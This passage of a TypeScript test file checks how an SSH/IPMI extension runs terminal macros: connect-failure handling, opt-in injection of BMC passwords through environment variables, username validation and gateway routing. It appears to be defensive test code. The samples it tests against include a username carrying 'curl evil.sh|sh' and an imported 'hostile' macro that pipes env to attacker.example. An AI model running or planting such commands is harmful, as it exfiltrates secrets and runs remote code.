 * "connected". `ConnectServerOptions.onConnectFailed` is that signal.
 */
describe("nexus.server.runMacro — connect-first flow", () => {
  const SESSION_MACRO: TerminalMacro = { id: "s", name: "Version", text: "show version\n", runIn: "session" };

  /** A core with no sessions yet and a live change event, plus a way to add one. */
  function connectableCore(): {
    core: unknown;
    register: (session: { id: string; serverId: string }) => void;
  } {
    const listeners = new Set<() => void>();
    const activeSessions: Array<{ id: string; serverId: string }> = [];
    return {
      core: {
        getSnapshot: () => ({ activeSessions: [...activeSessions], servers: [] }),
        getAuthProfile: () => undefined,
        onDidChange: (listener: () => void) => {
          listeners.add(listener);
          return () => listeners.delete(listener);
        }
      },
      register: (session) => {
        activeSessions.push(session);
        for (const listener of [...listeners]) {
          listener();
        }
      }
    };
  }

  function warnings(): string[] {
    return showWarningMessage.mock.calls.map((call) => String(call[0]));
  }

  it("settles the instant the connect fails, instead of waiting out the 90s watchdog", async () => {
    await setMacros([SESSION_MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showWarningMessage.mockResolvedValue("Connect and Run");
    connectServer.mockImplementation(
      async (_ctx: unknown, _id: unknown, options?: { onConnectFailed?: (message: string) => void }) => {
        // What production does: connectServer resolves (the terminal exists),
        // and the pty's own connect then fails inside it.
        options?.onConnectFailed?.("All configured authentication methods failed");
      }
    );

    const { core } = connectableCore();
    const ctx = context({ core } as unknown as Partial<CommandContext>);

    vi.useFakeTimers();
    try {
      let done = false;
      const run = runMacroOnServer(ctx, { server: server() }).then(() => {
        done = true;
      });

      // One second of virtual time — 1/90th of the watchdog. The pre-fix flow
      // could not settle until the timer itself fired.
      await vi.advanceTimersByTimeAsync(1_000);

      expect(done).toBe(true);
      expect(warnings()[1]).toBe('Could not connect to "Core Switch" — nothing was sent.');
      // Never the timeout copy: nothing timed out, and nothing "connected".
      expect(warnings().some((message) => message.includes("no session appeared in time"))).toBe(false);
      await run;
    } finally {
      vi.useRealTimers();
    }
  });

  it("still falls back to the timeout when the connect neither fails nor produces a session", async () => {
    await setMacros([SESSION_MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showWarningMessage.mockResolvedValue("Connect and Run");
    // Resolves and then nothing at all happens — a connect that hangs past the
    // watchdog, which is the only case the timer is still there for.
    connectServer.mockImplementation(async () => {});

    const { core } = connectableCore();
    const ctx = context({ core } as unknown as Partial<CommandContext>);

    vi.useFakeTimers();
    try {
      let done = false;
      const run = runMacroOnServer(ctx, { server: server() }).then(() => {
        done = true;
      });

      await vi.advanceTimersByTimeAsync(1_000);
      expect(done).toBe(false);

      await vi.advanceTimersByTimeAsync(90_000);
      expect(done).toBe(true);
      expect(warnings()[1]).toBe("Connected to Core Switch but no session appeared in time — nothing was sent.");
      await run;
    } finally {
      vi.useRealTimers();
    }
  });

  it("sends the macro to the terminal of the session the connect produced", async () => {
    await setMacros([SESSION_MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showWarningMessage.mockResolvedValue("Connect and Run");

    const sent: string[] = [];
    const sessionTerminal = { name: "Nexus SSH: Core Switch", sendText: (text: string) => sent.push(text) };
    openTerminals = [sessionTerminal];

    const { core, register } = connectableCore();
    const sessionTerminals = new Map<string, unknown>();
    connectServer.mockImplementation(async () => {
      sessionTerminals.set("sess-new", sessionTerminal);
      register({ id: "sess-new", serverId: "srv-1" });
    });
    const ctx = context({ core, sessionTerminals } as unknown as Partial<CommandContext>);

    await runMacroOnServer(ctx, { server: server() });

    expect(sent).toEqual(["show version\n"]);
    // Only the "not connected — connect now?" prompt; no failure copy of either kind.
    expect(warnings()).toHaveLength(1);
    expect(warnings()[0]).toContain("not connected");
  });
});

/**
 * Issue #48 PR-B §3.5 — the IPMI credential opt-in.
 *
 * Every fixture here is built to fail against a specific wrong implementation:
 * the withdrawn "the macro's text mentions an IPMI token, so inject" gate, a
 * truthiness read of the flag, a prompt that runs before the flag is consulted,
 * and an implementation that substitutes the password into the TEXT.
 */
describe("nexus.server.runMacro — IPMI credential injection (issue #48 §3.3)", () => {
  const SOL_TEXT = " ipmitool -I lanplus -H ${profile.ipmiHost} -U ${profile.ipmiUsername} -E sol activate\n";

  function ipmiServer(overrides: Partial<ServerConfig> = {}): ServerConfig {
    return server({ ipmiHost: "10.0.0.9", ipmiAuthProfileId: "ap-1", ...overrides });
  }

  /** A context whose vault answers with `secrets`, keyed by vault key. */
  function ipmiContext(secrets: Record<string, string> = {}, profiles: AuthProfile[] = [authProfile()]): CommandContext {
    return context({
      core: {
        getSnapshot: () => ({ activeSessions: [], servers: [] }),
        getAuthProfile: (id: string) => profiles.find((p) => p.id === id),
        onDidChange: () => () => {}
      },
      secretVault: {
        get: async (key: string) => secrets[key],
        store: async () => {},
        delete: async () => {}
      }
    } as unknown as Partial<CommandContext>);
  }

  const VAULTED = { "auth-profile-password-ap-1": "s3cr3t-bmc" };

  async function pickFirst(): Promise<void> {
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
  }

  it("injects the env pair for a FLAGGED local-terminal macro, and the password appears nowhere in the sent text", async () => {
    // The test the feature exists to prevent: an implementation that substitutes
    // the password into the command line puts it in `ps`, in the scrollback and
    // in TerminalCaptureBuffer — which `nexus.terminal.copyAll` exports.
    await setMacros([{ id: "a", name: "SOL", text: SOL_TEXT, runIn: "localTerminal", provideIpmiCredentials: true }]);
    await pickFirst();

    await runMacroOnServer(ipmiContext(VAULTED), { server: ipmiServer() });

    expect(createdTerminals).toHaveLength(1);
    expect(createdTerminals[0].env).toEqual({
      IPMITOOL_PASSWORD: "s3cr3t-bmc",
      IPMI_PASSWORD: "s3cr3t-bmc"
    });
    expect(createdTerminals[0].sent).toEqual([
      " ipmitool -I lanplus -H 10.0.0.9 -U bmc-operator -E sol activate\n"
    ]);
    expect(createdTerminals[0].sent[0]).not.toContain("s3cr3t-bmc");
    expect(showInputBox).not.toHaveBeenCalled();
  });

  it("gives an UNFLAGGED macro no environment at all, even though its text uses BOTH IPMI tokens (the finding-1 regression test)", async () => {
    // Deliberately the maximally tempting case for the WITHDRAWN token-presence
    // gate: full IPMI token usage, a linked profile, and a vaulted password. An
    // implementation gated on `profileTokensUsed(macro.text)` hands the
    // fleet-wide BMC password to this run; the shipped one hands over nothing.
    await setMacros([{ id: "a", name: "SOL", text: SOL_TEXT, runIn: "localTerminal" }]);
    await pickFirst();

    await runMacroOnServer(ipmiContext(VAULTED), { server: ipmiServer() });

    expect(createdTerminals).toHaveLength(1);
    // Asserted as ABSENCE of the option, not as a falsy value: `env: {}` would
    // pass a truthiness assertion while still being a different call.
    expect("env" in createdTerminals[0].options).toBe(false);
    // ...and no prompt either — prompting is the same disclosure decision moved
    // one dialog later.
    expect(showInputBox).not.toHaveBeenCalled();
  });

  it("injects for a flagged macro whose text uses NO IPMI token (kills a leftover token-presence condition ANDed onto the flag)", async () => {
    await setMacros([
      { id: "a", name: "Custom", text: "ipmitool -H 10.0.0.9 -E chassis power status\n", runIn: "localTerminal", provideIpmiCredentials: true }
    ]);
    await pickFirst();

    await runMacroOnServer(ipmiContext(VAULTED), { server: ipmiServer() });

    expect(createdTerminals[0].env).toEqual({
      IPMITOOL_PASSWORD: "s3cr3t-bmc",
      IPMI_PASSWORD: "s3cr3t-bmc"
    });
  });

  it.each([["true"], [1], [{}], ["yes"]])(
    "treats a non-boolean provideIpmiCredentials (%o) as OFF (kills a truthiness read)",
    async (rawFlag) => {
      await setMacros([
        {
          id: "a",
          name: "SOL",
          text: SOL_TEXT,
          runIn: "localTerminal",
          provideIpmiCredentials: rawFlag as unknown as boolean
        }
      ]);
      await pickFirst();

      await runMacroOnServer(ipmiContext(VAULTED), { server: ipmiServer() });

      expect("env" in createdTerminals[0].options).toBe(false);
      expect(showInputBox).not.toHaveBeenCalled();
    }
  );

  it("never injects on a SESSION macro, whatever the flag says", async () => {
    // The flag is only meaningful for a local terminal; a session send goes to a
    // remote shell where an extension-host environment variable means nothing,
    // and the editor never offers the box there.
    await setMacros([{ id: "a", name: "SOL", text: "show version\n", provideIpmiCredentials: true }]);
    await pickFirst();

    const sent: string[] = [];
    const sessionTerminal = { name: "Nexus SSH: Core Switch", sendText: (text: string) => sent.push(text) };
    openTerminals = [sessionTerminal];
    const ctx = ipmiContext(VAULTED);
    (ctx as unknown as { core: unknown }).core = {
      getSnapshot: () => ({ activeSessions: [{ id: "sess-1", serverId: "srv-1" }], servers: [] }),
      getAuthProfile: () => authProfile(),
      onDidChange: () => () => {}
    };
    (ctx.sessionTerminals as Map<string, unknown>).set("sess-1", sessionTerminal);

    await runMacroOnServer(ctx, { server: ipmiServer() });

    expect(createdTerminals).toHaveLength(0);
    expect(sent).toEqual(["show version\n"]);
  });

  it("prompts for the password when none is stored, and the answer lands in the env — never in the text", async () => {
    await setMacros([{ id: "a", name: "SOL", text: SOL_TEXT, runIn: "localTerminal", provideIpmiCredentials: true }]);
    await pickFirst();
    showInputBox.mockResolvedValue("typed-at-run-time");

    await runMacroOnServer(ipmiContext({}), { server: ipmiServer() });

    expect(showInputBox).toHaveBeenCalledTimes(1);
    expect((showInputBox.mock.calls[0][0] as { password?: boolean }).password).toBe(true);
    expect(createdTerminals[0].env).toEqual({
      IPMITOOL_PASSWORD: "typed-at-run-time",
      IPMI_PASSWORD: "typed-at-run-time"
    });
    expect(createdTerminals[0].sent[0]).not.toContain("typed-at-run-time");
  });

  it("aborts the whole run when that prompt is cancelled — no terminal, nothing sent", async () => {
    await setMacros([{ id: "a", name: "SOL", text: SOL_TEXT, runIn: "localTerminal", provideIpmiCredentials: true }]);
    await pickFirst();
    showInputBox.mockResolvedValue(undefined);

    await runMacroOnServer(ipmiContext({}), { server: ipmiServer() });

    // A terminal without the variable is not what the user asked for: ipmitool
    // would sit there prompting, or fail, in a window they did not want.
    expect(createdTerminals).toHaveLength(0);
    expect(String(setStatusBarMessage.mock.calls[0][0])).toContain("cancelled");
  });

  it("does NOT prompt for an unflagged macro with no stored password (kills a fallback that prompts before checking the flag)", async () => {
    await setMacros([{ id: "a", name: "SOL", text: SOL_TEXT, runIn: "localTerminal" }]);
    await pickFirst();

    await runMacroOnServer(ipmiContext({}), { server: ipmiServer() });

    expect(showInputBox).not.toHaveBeenCalled();
    expect(createdTerminals).toHaveLength(1);
    expect("env" in createdTerminals[0].options).toBe(false);
  });

  it("suggests the checkbox for a simple unflagged local `-E` macro, and still runs it", async () => {
    await setMacros([{ id: "a", name: "SOL", text: SOL_TEXT, runIn: "localTerminal" }]);
    await pickFirst();

    await runMacroOnServer(ipmiContext(VAULTED), { server: ipmiServer() });

    // The note is a suggestion; the terminal command still runs.
    expect(createdTerminals).toHaveLength(1);
    // It says where the checkbox lives in the channel that survives to the end
    // of the run.
    const status = setStatusBarMessage.mock.calls.map((call) => String(call[0])).join(" ");
    // C4 — shortened so the actionable tail survives the 4s status-bar clip.
    expect(status).toContain("IPMI credentials were not provided");
    expect(status).toContain("Provide IPMI credentials");
    expect(status).not.toMatch(/will fail|fail on/);
  });

  it("says nothing when a flagged macro runs, or when a local macro has nothing to do with IPMI", async () => {
    await setMacros([
      { id: "a", name: "SOL", text: SOL_TEXT, runIn: "localTerminal", provideIpmiCredentials: true },
      { id: "b", name: "Ping", text: "ping ${profile.host}\n", runIn: "localTerminal" }
    ]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) =>
      items.find((item) => item.macro.id === "a")
    );
    await runMacroOnServer(ipmiContext(VAULTED), { server: ipmiServer() });
    expect(String(setStatusBarMessage.mock.calls[0][0])).not.toContain("IPMI credentials");

    setStatusBarMessage.mockClear();
    // The scoping sibling: a plain local helper on a server that HAS an IPMI
    // profile must not be nagged, or the channel is noise and gets ignored.
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) =>
      items.find((item) => item.macro.id === "b")
    );
    await runMacroOnServer(ipmiContext(VAULTED), { server: ipmiServer() });
    expect(String(setStatusBarMessage.mock.calls[0][0])).not.toContain("IPMI credentials");
  });
});

describe("nexus.server.runMacro — ${profile.ipmiUsername}", () => {
  const MACRO: TerminalMacro = {
    id: "u",
    name: "SOL",
    text: "ipmitool -U ${profile.ipmiUsername} sol activate\n",
    runIn: "localTerminal"
  };

  it("resolves through the IPMI link, NOT the SSH one (kills reading either the server's username or its SSH profile's)", async () => {
    await setMacros([MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    // Three different usernames in play, so every wrong source produces a
    // visibly different command line.
    const ctx = contextWithAuthProfiles([
      authProfile({ id: "ap-ssh", username: "ssh-admin" }),
      authProfile({ id: "ap-bmc", username: "bmc-operator" })
    ]);
    await runMacroOnServer(ctx, {
      server: server({ username: "local-admin", authProfileId: "ap-ssh", ipmiAuthProfileId: "ap-bmc" })
    });

    expect(createdTerminals[0].sent).toEqual(["ipmitool -U bmc-operator sol activate\n"]);
  });

  it("refuses the run when no IPMI profile is linked, naming the field and where to set it", async () => {
    await setMacros([MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showErrorMessage.mockResolvedValue("Edit Server");

    const target = server({ authProfileId: "ap-1" });
    await runMacroOnServer(contextWithAuthProfiles([authProfile()]), { server: target });

    expect(createdTerminals).toHaveLength(0);
    const message = String(showErrorMessage.mock.calls[0][0]);
    expect(message).toContain("IPMI Username");
    expect(message).toContain("IPMI Auth Profile");
    expect(executeCommand).toHaveBeenCalledWith("nexus.server.edit", { server: target, expandAdvanced: true });
  });

  it("refuses a blank profile username rather than sending an empty -U argument", async () => {
    await setMacros([MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showErrorMessage.mockResolvedValue(undefined);

    await runMacroOnServer(contextWithAuthProfiles([authProfile({ id: "ap-bmc", username: "   " })]), {
      server: server({ ipmiAuthProfileId: "ap-bmc" })
    });

    expect(createdTerminals).toHaveLength(0);
    expect(String(showErrorMessage.mock.calls[0][0])).toContain("IPMI Username");
  });

  it("refuses a profile username carrying shell syntax before anything runs", async () => {
    await setMacros([MACRO]);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
    showErrorMessage.mockResolvedValue(undefined);

    await runMacroOnServer(
      contextWithAuthProfiles([authProfile({ id: "ap-bmc", username: "root; curl evil.sh|sh" })]),
      { server: server({ ipmiAuthProfileId: "ap-bmc" }) }
    );

    expect(createdTerminals).toHaveLength(0);
    expect(String(showErrorMessage.mock.calls[0][0])).toContain("can't be placed in a command");
  });
});

/**
 * Issue #48 §3.5 — the credential-harvest regression test, end to end.
 *
 * The data half lives in configCommandsMacros.test.ts (the sanitizer drops the
 * field); this is the half that matters to the user: the RUN path sees the
 * stripped record and hands over nothing. Stripping is only meaningful if the
 * runtime agrees, and the two are separated by the whole store.
 */
describe("an imported macro cannot arrive pre-armed (issue #48 §3.5)", () => {
  it("imports a hostile flagged macro and runs it against a fully configured server — no environment, no prompt", async () => {
    const hostile = {
      id: "hostile",
      name: "Check BMC reachability",
      text: "ping -c1 ${profile.ipmiHost} && env | curl -X POST --data-binary @- https://attacker.example/\n",
      runIn: "localTerminal",
      provideIpmiCredentials: true
    } as unknown as TerminalMacro;

    const incoming = collectIncomingMacros({ version: 2 as const, exportedAt: "", macros: [hostile] });
    await setMacros(incoming!.macros);
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);

    const ctx = context({
      core: {
        getSnapshot: () => ({ activeSessions: [], servers: [] }),
        getAuthProfile: () => authProfile(),
        onDidChange: () => () => {}
      },
      secretVault: {
        get: async () => "s3cr3t-bmc",
        store: async () => {},
        delete: async () => {}
      }
    } as unknown as Partial<CommandContext>);

    await runMacroOnServer(ctx, { server: server({ ipmiHost: "10.0.0.9", ipmiAuthProfileId: "ap-1" }) });

    expect(createdTerminals).toHaveLength(1);
    expect("env" in createdTerminals[0].options).toBe(false);
    expect(showInputBox).not.toHaveBeenCalled();
    // The password is nowhere in this run at all.
    expect(createdTerminals[0].sent.join("")).not.toContain("s3cr3t-bmc");
  });
});

/**
 * B1 (issue #48 PR-B) — Ogun's exact case: a SESSION-target macro whose text runs
 * ipmitool got zero IPMI messaging. The scan is a HINT, not a gate: it only appends
 * a delivery-note clause pointing at "Run in". If the scan were removed, the
 * "note present" cases below revert to `undefined` and fail.
 */
describe("sessionIpmiHintNote — session-target ipmitool hint", () => {
  it("returns the hint for a session macro that invokes ipmitool", () => {
    const note = sessionIpmiHintNote({ id: "a", name: "SOL", text: "ipmitool -H 10.0.0.9 sol activate\n", runIn: "session" });
    expect(note).toBeDefined();
    expect(note).toContain("SSH session");
    expect(note).toContain("Local terminal");
  });

  it("returns the hint for a session macro that uses an IPMI token (even without the literal word ipmitool)", () => {
    const note = sessionIpmiHintNote({ id: "a", name: "BMC", text: "ping -c1 ${profile.ipmiHost}\n", runIn: "session" });
    expect(note).toBeDefined();
  });

  it("treats an ABSENT runIn as session and still hints", () => {
    // Absent means session — the compatibility default — so a legacy macro (the
    // whole point of B1) is covered.
    const note = sessionIpmiHintNote({ id: "a", name: "SOL", text: "ipmitool chassis power status\n" });
    expect(note).toBeDefined();
  });

  it("returns nothing for a session macro whose text has nothing to do with IPMI", () => {
    expect(sessionIpmiHintNote({ id: "a", name: "Reload", text: "reload\n", runIn: "session" })).toBeUndefined();
  });

  it("does not fire on a word that merely contains 'ipmitool' as a substring", () => {
    // Word-boundary anchored — `myipmitoolwrapper` is not an ipmitool invocation.
    expect(sessionIpmiHintNote({ id: "a", name: "X", text: "myipmitoolwrapper --run\n", runIn: "session" })).toBeUndefined();
  });

  it.each([
    ['a quoted mention', 'echo "use ipmitool -E"\n'],
    ['a sudo user', 'sudo -u ipmitool bmc-login\n'],
    ['a comment', '# ipmitool -E\n'],
    ['a redirection target', 'echo hello >& ipmitool\n'],
    ['a literal backslash in double quotes', '"ipmi\\tool" -E\n'],
    ['a fully quoted assignment-shaped command', '"FOO=bar" ipmitool -E\n'],
    ['a sudo validate request', 'sudo -v ipmitool -E\n'],
    ['an assignment after command', 'command FOO=bar ipmitool -E\n'],
    ['an assignment after nice', 'nice FOO=bar ipmitool -E\n'],
    ['a command inspection', 'command -v ipmitool -E\n'],
    ['a leading redirection target', '>& ipmitool\n'],
    ['a clustered sudo username', 'sudo -nu ipmitool\n'],
    ['a redirection target after echo', 'echo &> ipmitool\n'],
    ['a quoted leading redirection', '">/tmp/log" ipmitool -E\n']
  ])("does not treat %s as an ipmitool command", (_case, text) => {
    expect(sessionIpmiHintNote({ id: "a", name: "X", text, runIn: "session" })).toBeUndefined();
  });

  it.each([
    ["an executable path", "/usr/bin/ipmitool -E\n"],
    ["a sudo command after its user option", "sudo -u root /usr/bin/ipmitool -E\n"],
    ["a sudo login shell command", "sudo -i ipmitool -E\n"],
    ["a sudo shell command", "sudo -s ipmitool -E\n"],
    ["a sudo noninteractive command", "sudo -n ipmitool -E\n"],
    ["an attached sudo user", "sudo --user=root ipmitool -E\n"],
    ["an attached sudo group", "sudo --group=wheel ipmitool -E\n"],
    ["a sudo environment assignment", "sudo BMC=1 ipmitool -E\n"],
    ["a clustered sudo user option", "sudo -nu root ipmitool -E\n"],
    ["an attached clustered sudo user", "sudo -nuroot ipmitool -E\n"],
    ["an attached env unset option", "env --unset=FOO ipmitool -E\n"],
    ["a quoted env assignment", "env 'BMC=hello world' ipmitool -E\n"],
    ["an attached short env unset option", "env -uFOO ipmitool -E\n"],
    ["the long sudo preserve-environment option", "sudo --preserve-env ipmitool -E\n"],
    ["a named sudo preserve-environment list", "sudo --preserve-env=PATH ipmitool -E\n"],
    ["a leading attached redirection", ">/tmp/ipmi.log ipmitool -E\n"],
    ["a leading separated redirection", "> /tmp/ipmi.log ipmitool -E\n"],
    ["a command wrapper with -p", "command -p ipmitool -E\n"],
    ["an exec wrapper with -c", "exec -c ipmitool -E\n"],
    ["a time wrapper with -p", "time -p ipmitool -E\n"],
    ["an env prefix", "env BMC=1 ipmitool -E\n"],
    ["a later command", "echo ready; ipmitool -E\n"],
    ["a command after a bare carriage return", "echo ready\ripmitool -E\r"],
    ["a command after a comment with backticks", "# log with `hostname`\nipmitool -E\n"],
    ["a command after a single quoted substitution", "echo '$(hostname)'; ipmitool -E\n"],
    ["a command after an assignment with a quoted value", 'FOO="bar" ipmitool -E\n']
  ])("recognizes ipmitool in command position with %s", (_case, text) => {
    expect(sessionIpmiHintNote({ id: "a", name: "X", text, runIn: "session" })).toBeDefined();
  });

  it("keeps quoted separators inside arguments and avoids guessing at nested shell commands", () => {
    expect(sessionIpmiHintNote({ id: "a", name: "X", text: 'ipmitool -U "ops;admin" -E\n', runIn: "session" })).toBeDefined();
    expect(sessionIpmiHintNote({ id: "a", name: "X", text: 'echo "then; ipmitool -E"\n', runIn: "session" })).toBeUndefined();
    expect(sessionIpmiHintNote({ id: "a", name: "X", text: "bash -c 'ipmitool -E'\n", runIn: "session" })).toBeUndefined();
  });

  it("returns nothing for a localTerminal ipmitool macro — that path is ipmiCredentialsOffNote's, not this one", () => {
    expect(
      sessionIpmiHintNote({ id: "a", name: "SOL", text: "ipmitool -H 10.0.0.9 sol activate\n", runIn: "localTerminal" })
    ).toBeUndefined();
  });

  it("returns nothing for a browser macro", () => {
    expect(sessionIpmiHintNote({ id: "a", name: "Web", text: "https://10.0.0.9/\n", runIn: "browser" })).toBeUndefined();
  });
});

/**
 * Issue #151 — the checkbox advice is intentionally narrow. It is shown only
 * for one plain local ipmitool command with -E and a standalone IPMI profile
 * token; complex shell text does not make the detector guess.
 */
describe("ipmiCredentialsOffNote — narrow local ipmitool credential hint (#151)", () => {
  const local = (text: string): TerminalMacro => ({ id: "a", name: "SOL", text, runIn: "localTerminal" });
  const hint = (text: string): string | undefined => ipmiCredentialsOffNote(local(text));

  it.each([
    ["no line ending", "ipmitool -H ${profile.ipmiHost} -E sol activate"],
    ["one LF", " ipmitool -H ${profile.ipmiHost} -U ${profile.ipmiUsername} -E sol activate\n"],
    ["one CRLF after horizontal whitespace", "  ipmitool -H ${profile.ipmiHost} -E sol activate \t\r\n"]
  ])("suggests credentials for one simple command ending with %s", (_ending, text) => {
    expect(hint(text)).toContain('tick "Provide IPMI credentials"');
  });

  it("keeps a quoted semicolon in the username and still suggests the missing local credentials", () => {
    expect(hint('ipmitool -H ${profile.ipmiHost} -U "ops;admin" -E sol activate\n'))
      .toContain('tick "Provide IPMI credentials"');
  });

  it.each([
    ["no IPMI profile token", "ipmitool -H 10.0.0.9 -E sol activate\n"],
    ["no -E flag", "ipmitool -H ${profile.ipmiHost} -a sol activate\n"],
    ["an explicit password beside -E", "ipmitool -H ${profile.ipmiHost} -E -P secret sol activate\n"],
    ["an attached -P password beside -E", "ipmitool -H ${profile.ipmiHost} -E -Psecret sol activate\n"],
    ["a clustered -P password beside -E", "ipmitool -H ${profile.ipmiHost} -E -vPsecret sol activate\n"],
    ["a password file beside -E", "ipmitool -H ${profile.ipmiHost} -E -f /etc/bmc.pass sol activate\n"],
    ["an attached password file beside -E", "ipmitool -H ${profile.ipmiHost} -E -f/etc/bmc.pass sol activate\n"],
    ["a clustered password-file option beside -E", "ipmitool -H ${profile.ipmiHost} -E -vf/etc/bmc.pass sol activate\n"],
    ["an option terminator before -E", "ipmitool -H ${profile.ipmiHost} -- -E sol activate\n"],
    ["an interactive prompt beside -E", "ipmitool -H ${profile.ipmiHost} -E -a sol activate\n"],
    ["authentication disabled with -A NONE", "ipmitool -H ${profile.ipmiHost} -E -A NONE sol activate\n"],
    ["authentication disabled with attached -ANONE", "ipmitool -H ${profile.ipmiHost} -E -ANONE sol activate\n"],
    ["authentication disabled in a short-option cluster", "ipmitool -H ${profile.ipmiHost} -E -vA NONE sol activate\n"],
    ["authentication disabled with lowercase -A none", "ipmitool -H ${profile.ipmiHost} -E -A none sol activate\n"],
    ["-U consuming -E as its username operand", "ipmitool -H ${profile.ipmiHost} -U -E sol activate\n"],
    ["-H consuming -E as its host operand", "ipmitool -H -E -U ${profile.ipmiUsername} sol activate\n"],
    ["-A consuming -E as its authentication operand", "ipmitool -A -E -H ${profile.ipmiHost} sol activate\n"],
    ["-I consuming -E as its interface operand", "ipmitool -I -E -H ${profile.ipmiHost} sol activate\n"],
    ["two terminal line endings", "ipmitool -H ${profile.ipmiHost} -E sol activate\n\n"],
    ["a bare carriage return", "ipmitool -H ${profile.ipmiHost} -E sol activate\r"],
    ["an executable path", "/usr/bin/ipmitool -H ${profile.ipmiHost} -E sol activate\n"],
    ["a wrapper", "sudo ipmitool -H ${profile.ipmiHost} -E sol activate\n"],
    ["a shell script", "sh -c 'ipmitool -H ${profile.ipmiHost} -E sol activate'\n"],
    ["a quoted token", 'ipmitool -H "${profile.ipmiHost}" -E sol activate\n'],
    ["shell expansion inside a quoted username", 'ipmitool -H ${profile.ipmiHost} -U "ops;$(id)" -E sol activate\n'],
    ["a token embedded in an argument", "ipmitool -H host${profile.ipmiHost} -E sol activate\n"],
    ["a pipeline", "ipmitool -H ${profile.ipmiHost} -E sol activate | tee log\n"],
    ["a redirection", "ipmitool -H ${profile.ipmiHost} -E sol activate >log\n"],
    ["a command substitution", "ipmitool -H ${profile.ipmiHost} -E $(echo sol) activate\n"],
    ["a line continuation", "ipmitool -H ${profile.ipmiHost} " + "\\" + "\n-E sol activate\n"],
    ["multiple commands", "ipmitool -H ${profile.ipmiHost} -E sol activate; echo done\n"],
    ["an additional line", "ipmitool -H ${profile.ipmiHost} -E sol activate\necho done\n"],
    ["an executable here-document", "sh <<'EOF'\nipmitool -H ${profile.ipmiHost} -E sol activate\nEOF\n"],
    ["a textual mention", "echo 'use ipmitool -H ${profile.ipmiHost} -E'\n"],
    ["a comment with a command-like phrase", "# ipmitool -H ${profile.ipmiHost} -E sol activate\n"]
  ])("does not suggest credentials for %s", (_shape, text) => {
    expect(hint(text)).toBeUndefined();
  });

  it.each([
    ["-a", "ipmitool -H ${profile.ipmiHost} -a sol activate\n"],
    ["-P", "ipmitool -H ${profile.ipmiHost} -P secret sol activate\n"],
    ["-f", "ipmitool -H ${profile.ipmiHost} -f /etc/bmc.pass sol activate\n"]
  ])("does not suggest credentials when ipmitool supplies its password with %s", (_flag, text) => {
    expect(hint(text)).toBeUndefined();
  });
});

describe("nexus.server.runMacro — jump-host IPMI routing (issue #48 PR-C)", () => {
  const GW_SOL = " ipmitool -H ${profile.ipmiHost} -a sol activate\n";

  async function pickFirst(): Promise<void> {
    showQuickPick.mockImplementation(async (items: Array<{ macro: TerminalMacro }>) => items[0]);
  }

  /**
   * A context whose snapshot carries both `servers` and `activeSessions`, plus a
   * `sessionTerminals` map — everything the gateway routing reads. `onDidChange`
   * is live so a connect-first path (used by the fall-back-with-no-session cases)
   * can register a session, though these fixtures pre-seed the gateway session.
   */
  function routingContext(opts: {
    servers: ServerConfig[];
    sessions?: Array<{ id: string; serverId: string }>;
    terminals?: Map<string, unknown>;
    authProfiles?: AuthProfile[];
  }): CommandContext {
    const listeners = new Set<() => void>();
    const activeSessions = [...(opts.sessions ?? [])];
    // Pinned session targets are re-checked against `window.terminals` before a
    // send (isTerminalStillValid), so a seeded gateway terminal must be listed as
    // open or the send is treated as "terminal closed".
    if (opts.terminals) {
      openTerminals = [...opts.terminals.values()] as typeof openTerminals;
    }
    return context({
      core: {
        getSnapshot: () => ({ activeSessions: [...activeSessions], servers: opts.servers }),
        getAuthProfile: (id: string) => opts.authProfiles?.find((profile) => profile.id === id),
        onDidChange: (listener: () => void) => {
          listeners.add(listener);
          return () => listeners.delete(listener);
        }
      },
      sessionTerminals: opts.terminals ?? new Map()
    } as unknown as Partial<CommandContext>);
  }

  it("delivers a route:ipmiGateway macro into the GATEWAY's session terminal, tokens resolved against the TARGET", async () => {
    // Target and gateway carry DIFFERENT ipmiHosts, so a bug that resolves tokens
    // against the gateway would send `10.9.9.9` — this asserts the target's
    // `10.0.0.9`. And a bug that delivers locally would create a terminal.
    const target = server({ id: "srv-1", name: "Target", ipmiHost: "10.0.0.9", ipmiGatewayServerId: "gw-1" });
    const gateway = server({ id: "gw-1", name: "Bastion", ipmiHost: "10.9.9.9" });
    const gwSent: string[] = [];
    const gwTerminal = { name: "Nexus SSH: Bastion", sendText: (text: string) => gwSent.push(text) };
    const ctx = routingContext({
      servers: [target, gateway],
      sessions: [{ id: "sess-gw", serverId: "gw-1" }],
      terminals: new Map<string, unknown>([["sess-gw", gwTerminal]])
    });
    await setMacros([{ id: "a", name: "SOL", text: GW_SOL, runIn: "localTerminal", route: "ipmiGateway" }]);
    await pickFirst();

    await runMacroOnServer(ctx, { server: target });

    // The gateway session got the TARGET's address, verbatim — never the gateway's.
    expect(gwSent).toEqual([" ipmitool -H 10.0.0.9 -a sol activate\n"]);
    // Never a local terminal, and never a fresh connect (the gateway was already up).
    expect(createdTerminals).toHaveLength(0);
    expect(connectServer).not.toHaveBeenCalled();
  });

  it("keeps an UNRELATED local macro on a gateway server LOCAL — no gateway session touched", async () => {
    // The finding-2 regression: a plain `ping` helper with NO route and NO IPMI
    // token, on a server that HAS a gateway. The gateway is given a live session
    // so a "gateway set ⇒ route everything" impl would visibly deliver there
    // (gwSent length 1, createdTerminals 0) — this asserts the opposite.
    const target = server({ id: "srv-1", name: "Target", ipmiGatewayServerId: "gw-1" });
    const gateway = server({ id: "gw-1", name: "Bastion" });
    const gwSent: string[] = [];
    const gwTerminal = { name: "Nexus SSH: Bastion", sendText: (text: string) => gwSent.push(text) };
    const ctx = routingContext({
      servers: [target, gateway],
      sessions: [{ id: "sess-gw", serverId: "gw-1" }],
